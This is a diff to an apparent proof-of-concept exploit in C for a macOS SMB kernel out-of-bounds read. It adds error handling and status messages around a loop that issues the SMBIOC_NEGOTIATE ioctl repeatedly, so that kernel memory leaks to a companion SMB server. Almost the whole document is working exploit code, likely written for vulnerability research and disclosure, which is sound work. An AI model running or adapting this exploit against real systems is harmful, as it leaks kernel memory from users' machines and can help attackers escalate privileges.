@@ -10,6 +10,7 @@
 #include <string.h>
 
 #include <sys/mount.h>
+#include <sys/errno.h>
 
 #include <arpa/inet.h>
 #include <IOKit/kext/KextManager.h>
@@ -212,9 +213,6 @@ int smb_client_open_dev(void) {
 int main(int argc, const char * argv[]) {
     smb_client_load_kext();
     
-    printf("[INFO] make sure the poc_snb_name_oob_read_server is started before proceeding further. press enter to continue\n");
-    getc(stdin);
-    
     int smb_dev = smb_client_open_dev();
     if (smb_dev < 0) {
         printf("[ERROR] failed to open smb dev, err: %s\n", strerror(errno));
@@ -267,11 +265,26 @@ int main(int argc, const char * argv[]) {
     
     int num_oob_reads = 10;
     
+    printf("[INFO] starting OOB read\n");
+    
     /// Execute the OOB read. The OOB read data will be sent to the SMB server
     /// Check the output of poc_snb_name_oob_read_server to see the OOB read data
     for (int i=0; i<num_oob_reads; i++) {
-        ioctl(smb_dev, SMBIOC_NEGOTIATE, &negotiate_req);
+        int res = ioctl(smb_dev, SMBIOC_NEGOTIATE, &negotiate_req);
+        if (res) {
+            printf("[ERROR] SMBIOC_NEGOTIATE ioctl request failed, err: %s", strerror(errno));
+            exit(1);
+        }
+        
+        if (negotiate_req.ioc_errno != EPIPE) {
+            printf("[ERROR] SMBIOC_NEGOTIATE ioctl request returned unexecpected ioc_errno: %s. make sure poc_snb_name_oob_server is running\n", strerror(negotiate_req.ioc_errno));
+            exit(1);
+        }
+        
+        negotiate_req.ioc_errno = 0;
     }
+    
+    printf("[INFO] OOB read complete. OOB read data will be printed on the console output of poc_snb_name_oob_server\n");
     
     return 0;
 }
